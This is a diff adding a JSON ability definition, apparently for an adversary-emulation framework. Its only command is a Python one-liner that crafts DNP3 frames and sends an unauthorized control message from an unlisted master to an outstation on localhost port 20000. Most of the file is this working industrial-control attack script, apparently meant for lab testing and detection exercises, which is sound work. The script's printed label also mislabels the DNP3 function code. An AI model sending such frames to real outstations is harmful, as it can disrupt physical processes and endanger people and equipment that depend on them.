@@ -1,0 +1,19 @@
+{
+  "id": "OT-DNP3-Sequence-Anomaly-Blue-Attack",
+  "name": "OT-DNP3-Sequence-Anomaly-Blue-Attack",
+  "description": "Executes the DNP3 Sequence Anomaly attack command using the python one-liner from the Red Module's attack script.",
+  "tactic": "impair-process-control",
+  "technique_id": "T1692",
+  "technique_name": "Unauthorized Message",
+  "sub_technique": "T1692.001",
+  "tag": "blue",
+  "executors": [
+    {
+      "name": "sh",
+      "platform": "linux",
+      "command": "python3 -c \"\nimport socket\nimport struct\n\ndef crc16(data):\n    crc = 0x0000\n    for byte in data:\n        crc ^= byte\n        for _ in range(8):\n            if (crc & 1):\n                crc = (crc >> 1) ^ 0xA6BC\n            else:\n                crc >>= 1\n    return ~crc & 0xFFFF\n\ndef make_dnp3_frame(control, dest_addr, src_addr, payload=b''):\n    start = b'\\x05\\x64'\n    length = 5 + len(payload)\n    hdr_data = start + bytes([length, control]) + struct.pack('<H', dest_addr) + struct.pack('<H', src_addr)\n    hdr_crc = struct.pack('<H', crc16(hdr_data))\n    \n    payload_with_crcs = b''\n    for i in range(0, len(payload), 16):\n        block = payload[i:i+16]\n        payload_with_crcs += block + struct.pack('<H', crc16(block))\n        \n    return hdr_data + hdr_crc + payload_with_crcs\n\ndef main():\n    dest_addr = 10\n    src_addr = 66\n    payload = b'\\xc0\\xc2\\x03\\x0c\\x01\\x28\\x01\\x07\\x00\\x01\\x01\\x01\\x00\\x00\\x00\\x00'\n    frame = make_dnp3_frame(0xc4, dest_addr, src_addr, payload)\n    \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(3)\n    try:\n        s.connect(('127.0.0.1', 20000))\n        print('[*] Connecting to DNP3 Outstation...')\n        s.send(frame)\n        print('[*] Unauthorized Direct Operate (FC3) sent from Master 66 (unlisted) to Index 7.')\n        resp = s.recv(1024)\n        if resp:\n            print('[+] Response received from Outstation!')\n            print('[+] Status: SUCCESS')\n        else:\n            print('[-] No response received.')\n    except Exception as e:\n        print(f'[-] Connection failed: {e}')\n    finally:\n        s.close()\n\nif __name__ == '__main__':\n    main()\n\"",
+      "payloads": [],
+      "parsers": []
+    }
+  ]
+}
